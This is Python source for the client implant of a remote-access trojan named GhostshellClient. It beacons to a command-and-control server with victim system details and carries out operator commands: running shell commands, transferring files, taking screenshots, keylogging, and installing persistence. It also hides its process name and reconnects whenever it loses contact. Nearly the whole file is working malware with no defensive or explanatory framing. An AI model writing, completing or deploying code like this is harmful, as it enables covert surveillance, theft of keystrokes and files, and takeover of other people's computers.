import socket
import os
import sys
import time
import signal
import platform
import socket as sock_mod
import threading
import argparse
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.protocol import recv_msg, send_msg, make_msg
from payload import config
from payload.connection import connect_to_c2, get_reconnect_delay
from payload.shell import execute as shell_execute
from payload.file_transfer import receive_file, send_file
from payload.screenshot import capture_base64
from payload.keylogger import Keylogger


class GhostshellClient:
    def __init__(self):
        self.sock = None
        self.running = True
        self.keylogger: Keylogger = None
        self._handlers = {
            "cmd": self._handle_cmd,
            "upload": self._handle_upload,
            "download": self._handle_download,
            "screenshot": self._handle_screenshot,
            "keylog_start": self._handle_keylog_start,
            "keylog_stop": self._handle_keylog_stop,
            "keylog_dump": self._handle_keylog_dump,
            "persist_install": self._handle_persist_install,
            "persist_remove": self._handle_persist_remove,
            "cleanup": self._handle_cleanup,
            "heartbeat": self._handle_heartbeat,
        }

    def start(self):
        if not self._check_pid():
            return
        self._disguise()
        signal.signal(signal.SIGTERM, lambda *_: self._shutdown())
        signal.signal(signal.SIGINT, lambda *_: self._shutdown())

        attempt = 0
        while self.running:
            if self._connect():
                attempt = 0
                self._main_loop()
            attempt += 1
            delay = get_reconnect_delay(attempt)
            time.sleep(delay)

    def _check_pid(self):
        if os.path.exists(config.PID_FILE):
            try:
                with open(config.PID_FILE) as f:
                    old_pid = int(f.read().strip())
                os.kill(old_pid, 0)
                # Process exists — exit
                return False
            except (OSError, ValueError):
                os.remove(config.PID_FILE)
        with open(config.PID_FILE, "w") as f:
            f.write(str(os.getpid()))
        return True

    def _disguise(self):
        try:
            from payload.disguise import set_process_name
            set_process_name("things.txt")
        except Exception:
            pass

    def _connect(self):
        try:
            self.sock = connect_to_c2(config.C2_HOST, config.C2_PORT, timeout=10)
            self.sock.settimeout(30)
            info = self._gather_info()
            send_msg(self.sock, make_msg("register", info))
            ack = recv_msg(self.sock)
            return True
        except Exception:
            self.sock = None
            return False

    def _gather_info(self):
        return {
            "hostname": platform.node(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "os": platform.system() + " " + platform.release(),
            "pid": os.getpid(),
            "ip_addr": self._local_ip(),
        }

    def _local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _main_loop(self):
        try:
            while self.running:
                msg = recv_msg(self.sock)
                handler = self._handlers.get(msg.get("type"))
                if handler:
                    handler(msg)
        except (ConnectionError, OSError, ValueError):
            pass
        finally:
            self._disconnect()

    def _send(self, msg):
        try:
            send_msg(self.sock, msg)
        except OSError:
            self.running = False

    # --- Command handlers ---

    def _handle_cmd(self, msg):
        cmd = msg.get("data", {}).get("command", "")
        timeout = msg.get("data", {}).get("timeout", 30)
        result = shell_execute(cmd, timeout)
        self._send(make_msg("cmd_result", result, ref_id=msg["id"]))

    def _handle_upload(self, msg):
        data = msg["data"]
        result = receive_file(data.get("path", ""), data.get("content", ""))
        self._send(make_msg("upload_ack", result, ref_id=msg["id"]))

    def _handle_download(self, msg):
        path = msg.get("data", {}).get("path", "")
        result = send_file(path)
        self._send(make_msg("download_result", result, ref_id=msg["id"]))

    def _handle_screenshot(self, msg):
        result = capture_base64()
        self._send(make_msg("screenshot_result", result, ref_id=msg["id"]))

    def _handle_keylog_start(self, msg):
        if self.keylogger is None:
            self.keylogger = Keylogger(config.KEYLOG_BUFFER)
        ok = self.keylogger.start()
        self._send(make_msg("status", {"status": "ok" if ok else "error", "message": "keylogger started" if ok else "keylogger failed to start"}))

    def _handle_keylog_stop(self, msg):
        if self.keylogger:
            self.keylogger.stop()
        self._send(make_msg("status", {"status": "ok", "message": "keylogger stopped"}))

    def _handle_keylog_dump(self, msg):
        data = ""
        if self.keylogger:
            data = self.keylogger.dump()
        self._send(make_msg("keylog_data", {"keystrokes": data, "duration_seconds": 0}, ref_id=msg["id"]))

    def _handle_persist_install(self, msg):
        from payload.persistence import install
        interval = msg.get("data", {}).get("interval_minutes", 5)
        exe_path = sys.argv[0]
        result = install(exe_path, interval)
        self._send(make_msg("status", result))

    def _handle_persist_remove(self, msg):
        from payload.persistence import remove
        result = remove(sys.argv[0])
        self._send(make_msg("status", result))

    def _handle_cleanup(self, msg):
        from payload.persistence import remove
        remove(sys.argv[0])
        if os.path.exists(config.PID_FILE):
            os.remove(config.PID_FILE)
        self._send(make_msg("status", {"status": "ok", "message": "cleanup done"}))
        self.running = False

    def _handle_heartbeat(self, msg):
        self._send(make_msg("heartbeat_ack", {"timestamp": time.time()}, ref_id=msg["id"]))

    def _disconnect(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _shutdown(self):
        self.running = False
        if self.keylogger:
            self.keylogger.stop()
        self._disconnect()
        try:
            os.remove(config.PID_FILE)
        except OSError:
            pass
        sys.exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--daemon", action="store_true", help="Run as daemon (staggered start)")
    args = parser.parse_args()

    if args.daemon:
        time.sleep(random.randint(0, 30))  # noqa: F821
    client = GhostshellClient()
    client.start()


if __name__ == "__main__":
    main()
